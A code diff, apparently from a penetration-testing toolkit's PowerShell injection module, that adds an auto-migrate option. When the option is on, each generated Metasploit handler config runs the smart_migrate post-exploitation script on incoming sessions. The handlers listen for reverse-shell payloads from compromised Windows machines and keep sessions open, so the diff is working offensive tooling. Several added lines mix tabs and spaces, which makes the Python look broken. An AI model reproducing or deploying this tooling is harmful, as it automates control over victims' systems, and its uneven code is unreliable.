@@ -6,6 +6,9 @@ import os
 import time
 from src.core.setcore import *
 
+# check if we are using auto_migrate
+auto_migrate = check_config("AUTO_MIGRATE=")
+
 # grab ipaddress
 if check_options("IPADDR=") != 0:
 	ipaddr = check_options("IPADDR=")
@@ -38,7 +41,10 @@ if os.path.isfile("%s/src/program_junk/meta_config_multipyinjector" % (definepat
 		match = re.search(port, data)
 		if not match:
 			filewrite = file("%s/src/program_junk/meta_config_multipyinjector" % (definepath), "a")
-			filewrite.write("\nuse exploit/multi/handler\nset PAYLOAD %s\nset LHOST 0.0.0.0\nset LPORT %s\nset ExitOnSession false\nexploit -j\n" % (powershell_inject_x86, port))
+			filewrite.write("\nuse exploit/multi/handler\n")
+                        if auto_migrate == "ON":
+                                filewrite.write("set AutoRunScript post/windows/manage/smart_migrate\n")
+			filewrite.write("set PAYLOAD %s\nset LHOST 0.0.0.0\nset LPORT %s\nset ExitOnSession false\nexploit -j\n" % (powershell_inject_x86, port))
 			filewrite.close()
 
 # if we have multi injection on, don't worry about these
@@ -83,8 +89,11 @@ if multi_injection == "on":
 			if os.path.isfile("%s/src/program_junk/meta_config_multipyinjector" % (definepath)):
 				port_check = check_ports("%s/src/program_junk/meta_config_multipyinjector" % (definepath), ports)
 				if port_check == False:
-					filewrite = file("%s/src/program_junk/meta_config_multipyinjector" % (definepath), "a")			
-					filewrite.write("\nuse exploit/multi/handler\nset PAYLOAD %s\nset LHOST 0.0.0.0\nset LPORT %s\nset ExitOnSession false\nexploit -j\n\n" % (powershell_inject_x86, ports))	
+					filewrite = file("%s/src/program_junk/meta_config_multipyinjector" % (definepath), "a")		
+		                        filewrite.write("\nuse exploit/multi/handler\n")
+                		        if auto_migrate == "ON":
+                                		filewrite.write("set AutoRunScript post/windows/manage/smart_migrate\n")	
+					filewrite.write("set PAYLOAD %s\nset LHOST 0.0.0.0\nset LPORT %s\nset ExitOnSession false\nexploit -j\n\n" % (powershell_inject_x86, ports))	
 					filewrite.close()
 
 			# if we aren't using multi pyinjector
@@ -97,7 +106,10 @@ if multi_injection == "on":
 				port_check = check_ports("%s/src/program_junk/meta_config" % (definepath), ports)
 				if port_check == False:
 					filewrite = file("%s/src/program_junk/meta_config" % (definepath), "a")
-					filewrite.write("\nuse exploit/multi/handler\nset PAYLOAD %s\n set LHOST 0.0.0.0\nset ExitOnSession false\nset LPORT %s\nexploit -j\n\n" % (powershell_inject_x86, ports))
+		                        filewrite.write("\nuse exploit/multi/handler\n")
+                		        if auto_migrate == "ON":
+                                		filewrite.write("set AutoRunScript post/windows/manage/smart_migrate\n")
+					filewrite.write("set PAYLOAD %s\n set LHOST 0.0.0.0\nset ExitOnSession false\nset LPORT %s\nexploit -j\n\n" % (powershell_inject_x86, ports))
 					filewrite.close()
 
 # if its turned to off
